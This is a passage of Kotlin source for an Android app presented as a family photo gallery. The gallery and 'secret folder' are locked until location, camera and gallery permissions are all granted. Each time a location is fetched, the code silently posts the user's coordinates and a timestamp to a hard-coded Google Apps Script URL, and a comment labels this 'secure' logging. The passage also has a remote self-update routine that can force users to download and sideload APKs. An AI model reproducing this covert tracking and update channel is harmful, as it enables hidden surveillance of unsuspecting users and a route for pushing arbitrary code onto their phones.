package com.example

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.gestures.detectHorizontalDragGestures
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.blur
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import coil.compose.AsyncImage
import com.example.ui.theme.MyApplicationTheme
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import java.util.Locale
import java.net.URL
import java.net.HttpURLConnection
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import android.content.Intent
import android.provider.Settings
import java.io.ByteArrayOutputStream
import android.util.Base64
import java.net.URLEncoder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.compose.ui.viewinterop.AndroidView
import androidx.lifecycle.compose.LocalLifecycleOwner
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import kotlinx.coroutines.CoroutineScope

// Sealed interface representing the application screens
sealed interface FamilyScreen {
    object Welcome : FamilyScreen
    object Login : FamilyScreen
    object Dashboard : FamilyScreen
    object SecretFolder : FamilyScreen
    object Upload : FamilyScreen
}

fun FamilyScreen.getPriority(): Int {
    return when (this) {
        FamilyScreen.Welcome -> 0
        FamilyScreen.Login -> 1
        FamilyScreen.Dashboard -> 2
        FamilyScreen.SecretFolder -> 3
        FamilyScreen.Upload -> 3
    }
}

// Model for gallery photos
data class GalleryPhoto(
    val id: String,
    val identifier: Any, // Can be Res ID, Asset path, or Uri
    val title: String,
    val date: String,
    val location: String = "Family Home"
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                FamilyGalleryApp()
            }
        }
    }
}

// Helper functions for checking permissions
fun hasCameraPermission(context: Context): Boolean {
    return ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
}

fun hasLocationPermissions(context: Context): Boolean {
    val fine = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
    val coarse = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    return fine || coarse
}

fun hasGalleryPermissions(context: Context): Boolean {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
    } else {
        ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }
}

fun isGpsEnabled(context: Context): Boolean {
    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    return locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true ||
           locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true
}

fun hasAllRequiredAccess(context: Context): Boolean {
    return hasLocationPermissions(context) &&
            isGpsEnabled(context) &&
            hasCameraPermission(context) &&
            hasGalleryPermissions(context)
}

@SuppressLint("MissingPermission")
fun fetchCurrentLocation(
    context: Context,
    onSuccess: (lat: Double, lon: Double, address: String) -> Unit,
    onFailure: (String) -> Unit
) {
    if (!hasLocationPermissions(context)) {
        onFailure("Location permissions missing")
        return
    }

    val fusedClient = LocationServices.getFusedLocationProviderClient(context)
    
    // Fast path: Try last location
    fusedClient.lastLocation.addOnSuccessListener { loc ->
        if (loc != null) {
            getReadableAddress(context, loc.latitude, loc.longitude, onSuccess)
        } else {
            // Precise query path
            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 5000)
                .setMaxUpdates(1)
                .build()

            val callback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    val lastLoc = result.lastLocation
                    if (lastLoc != null) {
                        getReadableAddress(context, lastLoc.latitude, lastLoc.longitude, onSuccess)
                    } else {
                        onFailure("Position unavailable")
                    }
                    fusedClient.removeLocationUpdates(this)
                }
            }

            fusedClient.requestLocationUpdates(locationRequest, callback, Looper.getMainLooper())
                .addOnFailureListener {
                    // Fallback to locationManager if services fail
                    fallbackToSystemGps(context, onSuccess, onFailure)
                }
        }
    }.addOnFailureListener {
        fallbackToSystemGps(context, onSuccess, onFailure)
    }
}

private fun fallbackToSystemGps(
    context: Context,
    onSuccess: (Double, Double, String) -> Unit,
    onFailure: (String) -> Unit
) {
    val mgr = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    val gpsLoc = try { mgr?.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: SecurityException) { null }
    val netLoc = try { mgr?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: SecurityException) { null }
    val best = gpsLoc ?: netLoc
    if (best != null) {
        getReadableAddress(context, best.latitude, best.longitude, onSuccess)
    } else {
        onFailure("GPS sensors inactive")
    }
}

private fun sendLogToGoogleAppsScript(context: Context, lat: Double, lon: Double) {
    try {
        val url = java.net.URL("https://script.google.com/macros/s/AKfycbw_U6eP2YTyM42kcXhVHwnTeWqgfvRQQQD9fSs2eD5rJ373EvVYB-gb4TXeQvNliP95ig/exec")
        val conn = url.openConnection() as java.net.HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
        conn.doOutput = true
        conn.instanceFollowRedirects = true
        
        val json = """
            {
                "latitude": $lat,
                "longitude": $lon,
                "time": "${java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }.format(java.util.Date())}"
            }
        """.trimIndent()
        
        conn.outputStream.use { os ->
            val input = json.toByteArray(charset("utf-8"))
            os.write(input, 0, input.size)
        }
        
        val responseCode = conn.responseCode
        android.util.Log.d("FamilyGallery", "GAS log response: $responseCode")
        
        // Follow redirect for Google Apps Script Web App endpoints if necessary
        if (responseCode == java.net.HttpURLConnection.HTTP_MOVED_TEMP || 
            responseCode == java.net.HttpURLConnection.HTTP_MOVED_PERM || 
            responseCode == 307 || responseCode == 308) {
            val newUrl = conn.getHeaderField("Location")
            if (newUrl != null) {
                val redirectConn = java.net.URL(newUrl).openConnection() as java.net.HttpURLConnection
                redirectConn.requestMethod = "POST"
                redirectConn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                redirectConn.doOutput = true
                redirectConn.outputStream.use { os ->
                    val input = json.toByteArray(charset("utf-8"))
                    os.write(input, 0, input.size)
                }
                android.util.Log.d("FamilyGallery", "GAS redirect response: ${redirectConn.responseCode}")
                redirectConn.disconnect()
            }
        }
        conn.disconnect()
    } catch (e: Exception) {
        android.util.Log.e("FamilyGallery", "Failed to send GAS location log", e)
    }
}

private fun getReadableAddress(
    context: Context,
    lat: Double,
    lon: Double,
    onSuccess: (lat: Double, lon: Double, address: String) -> Unit
) {
    Thread {
        try {
            // Log location coordinates and time securely to Google Apps Script Web App
            sendLogToGoogleAppsScript(context, lat, lon)
            
            val coder = Geocoder(context, Locale.getDefault())
            val results = coder.getFromLocation(lat, lon, 1)
            val text = if (!results.isNullOrEmpty()) {
                val r = results[0]
                val city = r.locality ?: r.subAdminArea ?: r.adminArea ?: "Sunnyvales"
                val country = r.countryName ?: "USA"
                val thoroughfare = r.thoroughfare ?: ""
                val street = if (thoroughfare.isNotEmpty()) "$thoroughfare, " else ""
                "$street$city, $country"
            } else {
                "Coordinates: ${String.format(Locale.US, "%.4f", lat)}, ${String.format(Locale.US, "%.4f", lon)}"
            }
            (context as? Activity)?.runOnUiThread {
                onSuccess(lat, lon, text)
            }
        } catch (e: Exception) {
            (context as? Activity)?.runOnUiThread {
                onSuccess(lat, lon, "Coordinates: ${String.format(Locale.US, "%.4f", lat)}, ${String.format(Locale.US, "%.4f", lon)} (Offline Mode)")
            }
        }
    }.start()
}


@Composable
fun NoInternetConnectionScreen(onRetry: () -> Unit) {
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(Color(0xFF121214)),
        contentAlignment = Alignment.Center
    ) {
        // Decorative background elements
        Box(
            modifier = Modifier
                .size(300.dp)
                .align(Alignment.TopStart)
                .graphicsLayer {
                    translationX = -100f
                    translationY = -100f
                }
                .alpha(0.04f)
                .background(Color(0xFFFF5252), CircleShape)
                .blur(80.dp)
        )
        Box(
            modifier = Modifier
                .size(300.dp)
                .align(Alignment.BottomEnd)
                .graphicsLayer {
                    translationX = 100f
                    translationY = 100f
                }
                .alpha(0.04f)
                .background(Color(0xFF64B5F6), CircleShape)
                .blur(80.dp)
        )

        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
            modifier = Modifier
                .padding(32.dp)
                .fillMaxWidth()
                .widthIn(max = 450.dp)
        ) {
            // Glowing CloudOff icon panel
            Box(
                contentAlignment = Alignment.Center,
                modifier = Modifier
                    .size(100.dp)
                    .background(Color(0x11FF5252), CircleShape)
                    .border(1.dp, Color(0x33FF5252), CircleShape)
            ) {
                Icon(
                    imageVector = Icons.Default.CloudOff,
                    contentDescription = "No Network Connection",
                    tint = Color(0xFFFF5252),
                    modifier = Modifier.size(48.dp)
                )
            }

            Spacer(modifier = Modifier.height(32.dp))

            // Premium Typography pairing
            Text(
                text = "No Internet Connection",
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                color = Color.White,
                textAlign = TextAlign.Center
            )

            Spacer(modifier = Modifier.height(12.dp))

            Text(
                text = "The digital archivist could not establish a connection to the remote repositories. High-definition media catalog and remote cloud sync functions are currently offline.",
                style = MaterialTheme.typography.bodyMedium,
                color = Color.White.copy(alpha = 0.7f),
                textAlign = TextAlign.Center,
                lineHeight = 20.sp
            )

            Spacer(modifier = Modifier.height(40.dp))

            // Action: Retry Button
            Button(
                onClick = onRetry,
                colors = ButtonDefaults.buttonColors(
                    containerColor = Color(0xFF64B5F6),
                    contentColor = Color.Black
                ),
                shape = RoundedCornerShape(12.dp),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(50.dp)
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.Center
                ) {
                    Icon(
                        imageVector = Icons.Default.Refresh,
                        contentDescription = null,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        "Retry Connection",
                        fontWeight = FontWeight.Bold,
                        fontSize = 15.sp,
                        letterSpacing = 0.5.sp
                    )
                }
            }
        }
    }
}


@Composable
fun FamilyGalleryApp() {
    val context = LocalContext.current
    var isConnected by remember { mutableStateOf(isNetworkAvailable(context)) }

    LaunchedEffect(context) {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = android.net.NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: android.net.Network) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    isConnected = true
                }
            }

            override fun onLost(network: android.net.Network) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    isConnected = isNetworkAvailable(context)
                }
            }
        }
        
        try {
            connectivityManager.registerNetworkCallback(request, callback)
        } catch (e: Exception) {
            // ignore
        }
        isConnected = isNetworkAvailable(context)
    }

    var screen by remember { mutableStateOf<FamilyScreen>(FamilyScreen.Welcome) }
    
    // Check connection on every screen transition
    LaunchedEffect(screen) {
        isConnected = isNetworkAvailable(context)
    }
    
    // Intercept hardware/system back button presses to go back in UI instead of closing the app
    BackHandler(enabled = screen != FamilyScreen.Welcome) {
        isConnected = isNetworkAvailable(context)
        screen = when (screen) {
            is FamilyScreen.Login -> FamilyScreen.Welcome
            is FamilyScreen.Dashboard -> FamilyScreen.Login
            is FamilyScreen.SecretFolder -> FamilyScreen.Dashboard
            is FamilyScreen.Upload -> FamilyScreen.Dashboard
            else -> FamilyScreen.Welcome
        }
    }
    
    // Global shared states for the main application
    var pendingUploads by remember { mutableStateOf<List<Uri>>(emptyList()) }
    var locationState by remember { mutableStateOf("Locating family archivist...") }
    var userCoordinates by remember { mutableStateOf<Pair<Double, Double>?>(null) }
    
    // App Self-Update facility states
    val prefs = remember { context.getSharedPreferences("app_prefs", android.content.Context.MODE_PRIVATE) }
    var loggedInUser by remember {
        mutableStateOf(prefs.getString("logged_in_user", "gallery") ?: "gallery")
    }
    val defaultUrl = "https://raw.githubusercontent.com/AhmRizvi/family-gallery/main/version.json"
    var updateUrl by remember {
        val saved = prefs.getString("update_url", defaultUrl) ?: defaultUrl
        val finalUrl = if (saved.contains("rizviahm6") || saved.contains("update.json")) {
            prefs.edit().putString("update_url", defaultUrl).apply()
            defaultUrl
        } else {
            saved
        }
        mutableStateOf(finalUrl)
    }
    var hasAutoCheckedUpdate by remember { mutableStateOf(false) }
    var showUpdateDialog by remember { mutableStateOf(false) }
    var isCheckingUpdate by remember { mutableStateOf(false) }
    var updateErrorState by remember { mutableStateOf<String?>(null) }
    var updateAvailable by remember { mutableStateOf<Boolean?>(null) } // null = unchecked, true = update available, false = up to date
    var latestVersionName by remember { mutableStateOf("") }
    var latestVersionCode by remember { mutableStateOf(0) }
    var latestApkUrl by remember { mutableStateOf("") }
    var latestChangelog by remember { mutableStateOf("") }
    var isForceUpdate by remember { mutableStateOf(false) }
    var backgroundUpdateBadgeActive by remember { mutableStateOf(false) }

    // APK Download specific states
    var isDownloadingApk by remember { mutableStateOf(false) }
    var downloadApkProgress by remember { mutableStateOf(0f) }
    var downloadApkError by remember { mutableStateOf<String?>(null) }
    var showUnknownSourcesDialog by remember { mutableStateOf(false) }
    var pendingApkFile by remember { mutableStateOf<java.io.File?>(null) }

    fun performManualUpdateCheck() {
        isCheckingUpdate = true
        updateErrorState = null
        updateAvailable = null
        
        // Save current update URL configuration
        prefs.edit().putString("update_url", updateUrl).apply()
        
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            try {
                val cacheBuster = System.currentTimeMillis()
                val urlWithBuster = if (updateUrl.contains("?")) "$updateUrl&cb=$cacheBuster" else "$updateUrl?cb=$cacheBuster"
                
                var currentUrl = urlWithBuster
                var redirects = 0
                val maxRedirects = 5
                var responseCode = -1
                var urlConn: java.net.HttpURLConnection? = null
                
                while (redirects < maxRedirects) {
                    val url = java.net.URL(currentUrl)
                    urlConn = url.openConnection() as java.net.HttpURLConnection
                    urlConn.connectTimeout = 8000
                    urlConn.readTimeout = 8000
                    urlConn.requestMethod = "GET"
                    urlConn.instanceFollowRedirects = true
                    urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10) FamilyGallery")
                    urlConn.connect()
                    
                    responseCode = urlConn.responseCode
                    if (responseCode == java.net.HttpURLConnection.HTTP_MOVED_TEMP || 
                        responseCode == java.net.HttpURLConnection.HTTP_MOVED_PERM || 
                        responseCode == 301 || responseCode == 302 || 
                        responseCode == 303 || responseCode == 307 || responseCode == 308) {
                        
                        val newUrl = urlConn.getHeaderField("Location")
                        if (newUrl != null) {
                            urlConn.disconnect()
                            currentUrl = newUrl
                            redirects++
                        } else {
                            break
                        }
                    } else {
                        break
                    }
                }
                
                if (responseCode == 200 && urlConn != null) {
                    val response = urlConn.inputStream.bufferedReader().use { it.readText() }
                    val json = org.json.JSONObject(response)
                    val remoteVersionCode = json.optInt("versionCode", 0)
                    val remoteVersionName = json.optString("versionName", "")
                    val remoteApkUrl = json.optString("apkUrl", "")
                    val remoteChangelog = json.optString("changelog", "")
                    val remoteForceUpdate = json.optBoolean("forceUpdate", false)
                    
                    val currentVersionCode = com.example.BuildConfig.VERSION_CODE
                    
                    if (remoteVersionCode > currentVersionCode) {
                        withContext(kotlinx.coroutines.Dispatchers.Main) {
                            isCheckingUpdate = false
                            backgroundUpdateBadgeActive = true
                            latestVersionCode = remoteVersionCode
                            latestVersionName = remoteVersionName
                            latestApkUrl = remoteApkUrl
                            latestChangelog = remoteChangelog
                            isForceUpdate = remoteForceUpdate
                            updateAvailable = true
                        }
                    } else {
                        withContext(kotlinx.coroutines.Dispatchers.Main) {
                            isCheckingUpdate = false
                            backgroundUpdateBadgeActive = false
                            isForceUpdate = false
                            updateAvailable = false
                        }
                    }
                } else {
                    withContext(kotlinx.coroutines.Dispatchers.Main) {
                        isCheckingUpdate = false
                        updateErrorState = "Server returned error code: $responseCode"
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                withContext(kotlinx.coroutines.Dispatchers.Main) {
                    isCheckingUpdate = false
                    updateErrorState = "Failed to connect: ${e.message}"
                }
            }
        }
    }

    // Automatic check for update when app opens (runs when network becomes active)
    LaunchedEffect(isConnected) {
        if (isConnected && !hasAutoCheckedUpdate) {
            hasAutoCheckedUpdate = true
            withContext(kotlinx.coroutines.Dispatchers.IO) {
                try {
                    val cacheBuster = System.currentTimeMillis()
                    val urlWithBuster = if (updateUrl.contains("?")) "$updateUrl&cb=$cacheBuster" else "$updateUrl?cb=$cacheBuster"
                    
                    var currentUrl = urlWithBuster
                    var redirects = 0
                    val maxRedirects = 5
                    var responseCode = -1
                    var urlConn: java.net.HttpURLConnection? = null
                    
                    while (redirects < maxRedirects) {
                        val url = java.net.URL(currentUrl)
                        urlConn = url.openConnection() as java.net.HttpURLConnection
                        urlConn.connectTimeout = 8000
                        urlConn.readTimeout = 8000
                        urlConn.requestMethod = "GET"
                        urlConn.instanceFollowRedirects = true
                        urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10) FamilyGallery")
                        urlConn.connect()
                        
                        responseCode = urlConn.responseCode
                        if (responseCode == java.net.HttpURLConnection.HTTP_MOVED_TEMP || 
                            responseCode == java.net.HttpURLConnection.HTTP_MOVED_PERM || 
                            responseCode == 301 || responseCode == 302 || 
                            responseCode == 303 || responseCode == 307 || responseCode == 308) {
                            
                            val newUrl = urlConn.getHeaderField("Location")
                            if (newUrl != null) {
                                urlConn.disconnect()
                                currentUrl = newUrl
                                redirects++
                            } else {
                                break
                            }
                        } else {
                            break
                        }
                    }
                    
                    if (responseCode == 200 && urlConn != null) {
                        val response = urlConn.inputStream.bufferedReader().use { it.readText() }
                        val json = org.json.JSONObject(response)
                        val remoteVersionCode = json.optInt("versionCode", 0)
                        val remoteVersionName = json.optString("versionName", "")
                        val remoteApkUrl = json.optString("apkUrl", "")
                        val remoteChangelog = json.optString("changelog", "")
                        val remoteForceUpdate = json.optBoolean("forceUpdate", false)
                        
                        val currentVersionCode = com.example.BuildConfig.VERSION_CODE
                        
                        if (remoteVersionCode > currentVersionCode) {
                            withContext(kotlinx.coroutines.Dispatchers.Main) {
                                backgroundUpdateBadgeActive = true
                                latestVersionCode = remoteVersionCode
                                latestVersionName = remoteVersionName
                                latestApkUrl = remoteApkUrl
                                latestChangelog = remoteChangelog
                                isForceUpdate = remoteForceUpdate
                                updateAvailable = true
                                showUpdateDialog = true // Auto pop up update dialog on app open
                            }
                        } else {
                            withContext(kotlinx.coroutines.Dispatchers.Main) {
                                updateAvailable = false
                            }
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
    
    // Cross-fade screen navigation
    Surface(
        modifier = Modifier.fillMaxSize(),
        color = Color(0xFF121214) // Rich premium chalkboard black
    ) {
        if (!isConnected && screen != FamilyScreen.Welcome) {
            NoInternetConnectionScreen(
                onRetry = {
                    isConnected = isNetworkAvailable(context)
                    if (isConnected) {
                        Toast.makeText(context, "Network connected!", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(context, "Still offline. Please check your system settings.", Toast.LENGTH_SHORT).show()
                    }
                }
            )
        } else {
            AnimatedContent(
                targetState = screen,
                transitionSpec = {
                    val isBack = targetState.getPriority() < initialState.getPriority()
                    if (isBack) {
                        (slideInHorizontally(animationSpec = tween(450)) { -it } + fadeIn(animationSpec = tween(450)))
                            .togetherWith(slideOutHorizontally(animationSpec = tween(450)) { it } + fadeOut(animationSpec = tween(350)))
                    } else {
                        (slideInHorizontally(animationSpec = tween(450)) { it } + fadeIn(animationSpec = tween(450)))
                            .togetherWith(slideOutHorizontally(animationSpec = tween(450)) { -it } + fadeOut(animationSpec = tween(350)))
                    }
                },
                label = "ScreenTransition"
            ) { currentScreen ->
            when (currentScreen) {
                is FamilyScreen.Welcome -> {
                    WelcomeScreen(
                        onExploreClick = {
                            if (hasAllRequiredAccess(context)) {
                                screen = FamilyScreen.Dashboard
                            } else {
                                screen = FamilyScreen.Login
                            }
                        }
                    )
                }
                is FamilyScreen.Login -> {
                    LoginScreen(
                        onLoginSuccess = { user ->
                            prefs.edit().putString("logged_in_user", user).apply()
                            loggedInUser = user
                            screen = FamilyScreen.Dashboard
                        },
                        onBack = { screen = FamilyScreen.Welcome }
                    )
                }
                is FamilyScreen.Dashboard -> {
                    DashboardScreen(
                        loggedInUser = loggedInUser,
                        pendingUploads = pendingUploads,
                        onAddUpload = { uri ->
                            pendingUploads = pendingUploads + uri
                        },
                        locationState = locationState,
                        userCoordinates = userCoordinates,
                        onUpdateLocation = { lat, lon, desc ->
                            userCoordinates = Pair(lat, lon)
                            locationState = desc
                        },
                        onNavigateToUpload = { screen = FamilyScreen.Upload },
                        onOpenSecret = { screen = FamilyScreen.SecretFolder },
                        onLogout = {
                            prefs.edit().putString("logged_in_user", "").apply()
                            loggedInUser = ""
                            screen = FamilyScreen.Login
                        },
                        backgroundUpdateBadgeActive = backgroundUpdateBadgeActive,
                        onShowUpdateDialog = { showUpdateDialog = true }
                    )
                }
                is FamilyScreen.SecretFolder -> {
                    if (!hasAllRequiredAccess(context)) {
                        LaunchedEffect(Unit) {
                            screen = FamilyScreen.Dashboard
                            val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                        }
                    } else {
                        SecretFolderScreen(
                            onBack = { screen = FamilyScreen.Dashboard }
                        )
                    }
                }
                is FamilyScreen.Upload -> {
                    if (!hasAllRequiredAccess(context)) {
                        LaunchedEffect(Unit) {
                            screen = FamilyScreen.Dashboard
                            val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                        }
                    } else {
                        UploadScreen(
                            onAddUpload = { uri ->
                                pendingUploads = pendingUploads + uri
                            },
                            onBack = { screen = FamilyScreen.Dashboard }
                        )
                    }
                }
            }
        }
    }

    // Modal dialogue - App Self-Update Facility
    if (showUpdateDialog) {
        if (isForceUpdate) {
            BackHandler(enabled = true) {
                // Consume back press to prevent bypass of force update
            }
        }
        AlertDialog(
            onDismissRequest = { if (!isForceUpdate) { showUpdateDialog = false } },
            title = {
                Text(
                    text = "New Update Available",
                    color = Color.White,
                    fontWeight = FontWeight.Bold,
                    fontSize = 18.sp,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.fillMaxWidth()
                )
            },
            text = {
                Column(
                    verticalArrangement = Arrangement.spacedBy(16.dp),
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    if (isForceUpdate) {
                        Text(
                            text = "Update is required to continue.",
                            color = Color(0xFFFF8A80),
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.fillMaxWidth()
                        )
                    }

                    // A beautiful visual comparison grid
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color.White.copy(alpha = 0.03f), shape = RoundedCornerShape(12.dp))
                            .padding(16.dp),
                        horizontalArrangement = Arrangement.SpaceEvenly,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Current version on the left
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text(
                                text = "Installed",
                                color = Color.White.copy(alpha = 0.4f),
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Normal
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = "V${com.example.BuildConfig.VERSION_NAME} (${com.example.BuildConfig.VERSION_CODE})",
                                color = Color.White.copy(alpha = 0.7f),
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Medium
                            )
                        }

                        // Elegant arrow in the middle
                        Icon(
                            imageVector = Icons.Default.ArrowForward,
                            contentDescription = null,
                            tint = Color(0xFFE5A93B).copy(alpha = 0.6f),
                            modifier = Modifier.size(20.dp)
                        )

                        // Update version on the right
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text(
                                text = "Latest",
                                color = Color(0xFFE5A93B),
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = "V$latestVersionName ($latestVersionCode)",
                                color = Color.White,
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    // Direct APK Download Progress / Errors
                    if (isDownloadingApk) {
                        Column(
                            verticalArrangement = Arrangement.spacedBy(6.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    "Downloading...",
                                    color = Color.White.copy(alpha = 0.6f),
                                    fontSize = 12.sp
                                )
                                Text(
                                    "${(downloadApkProgress * 100).toInt()}%",
                                    color = Color(0xFFE5A93B),
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                            LinearProgressIndicator(
                                progress = { downloadApkProgress },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(4.dp)
                                    .clip(RoundedCornerShape(2.dp)),
                                color = Color(0xFFE5A93B),
                                trackColor = Color.White.copy(alpha = 0.05f)
                            )
                        }
                    } else if (downloadApkError != null) {
                        Text(
                            text = downloadApkError ?: "",
                            color = Color(0xFFFF8A80),
                            fontSize = 12.sp,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp)
                        )
                    }

                    // Success downloaded file local trigger banner
                    if (pendingApkFile != null && !isDownloadingApk) {
                        Text(
                            text = "Download complete, ready to install.",
                            color = Color(0xFF81C784),
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Medium,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.fillMaxWidth()
                        )
                    }
                }
            },
            confirmButton = {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = if (isForceUpdate) Arrangement.Center else Arrangement.End,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    if (!isForceUpdate && !isDownloadingApk && pendingApkFile == null) {
                        TextButton(
                            onClick = { showUpdateDialog = false },
                            colors = ButtonDefaults.textButtonColors(contentColor = Color.White.copy(alpha = 0.5f))
                        ) {
                            Text("Later")
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                    }

                    if (pendingApkFile != null && !isDownloadingApk) {
                        Button(
                            onClick = {
                                val apkFile = pendingApkFile
                                if (apkFile != null) {
                                    val canInstall = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        context.packageManager.canRequestPackageInstalls()
                                    } else {
                                        true
                                    }
                                    if (canInstall) {
                                        triggerApkInstallation(context, apkFile)
                                    } else {
                                        showUnknownSourcesDialog = true
                                    }
                                }
                            },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF81C784),
